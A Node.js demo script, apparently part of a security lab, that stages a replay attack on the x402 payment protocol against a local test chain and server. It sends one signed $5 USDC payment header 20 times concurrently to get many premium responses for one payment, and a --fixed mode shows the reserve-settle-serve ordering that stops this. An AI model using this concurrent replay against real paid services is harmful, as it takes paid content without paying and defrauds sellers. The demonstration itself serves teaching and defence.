// Attack #1: one payment, many responses.
//   node demos/01-replay.mjs            vulnerable server (verify -> serve -> settle later)
//   node demos/01-replay.mjs --fixed    reserve the payment ID, settle, then serve
import { startChain, stopChain, setup, roles, usdcBalance, fmtUsdc } from "../lib/chain.mjs";
import { createFacilitator } from "../lib/facilitator.mjs";
import { createResourceServer } from "../lib/server.mjs";
import { requirements, signPayment, encode } from "../lib/x402.mjs";
import { session, color } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const N = 20;
const t = session(fixed ? "x402-replay-fixed" : "x402-replay", fixed ? "Replay, fixed" : "Replay");

await startChain();
const { usdc } = await setup();
const fac = createFacilitator({ usdc }); await fac.listen();
const srv = createResourceServer({ usdc, payTo: roles.seller.address, facilitatorUrl: fac.url, order: fixed ? "reserve-settle-serve" : "serve-then-settle" }); await srv.listen();
const before = await usdcBalance(usdc, roles.seller.address);

t.cmd(`node attack.mjs --target /premium --copies ${N}`);
const req = requirements({ resource: "/premium", price: 5_000_000n, payTo: roles.seller.address, usdc });
const header = encode(await signPayment(roles.buyer, req));
t.note(`signed ONE payment: $5.00 USDC   nonce ${JSON.parse(Buffer.from(header, "base64")).payload.authorization.nonce.slice(0, 12)}…`);
t.note(`sending the same X-PAYMENT header ${N} times, at once`);

const results = await Promise.all(Array.from({ length: N }, () => fetch(srv.url + "/premium", { headers: { "x-payment": header } }).then((r) => r.status)));
results.forEach((s, i) => (s === 200 ? t.ok : t.bad)(`  request ${String(i + 1).padStart(2)}  ${s === 200 ? "200 OK   premium data served" : "402      refused"}`));

await new Promise((r) => setTimeout(r, 1700)); // the vulnerable server settles 1.5 s after serving
await fac.idle();
const paid = (await usdcBalance(usdc, roles.seller.address)) - before;
const paidCount = Number(paid / 5_000_000n); // read from the chain, not from our own counters
t.say("");
t.big(`SERVED: ${srv.stats.served}    PAID: ${paidCount}    seller received $${fmtUsdc(paid)} of $${fmtUsdc(BigInt(srv.stats.served) * 5_000_000n)}`);
fixed ? t.ok("one payment, one response") : t.bad(`${srv.stats.served} premium responses for the price of ${paidCount}`);

t.save(); await srv.close(); await fac.close(); stopChain(); process.exit(0);
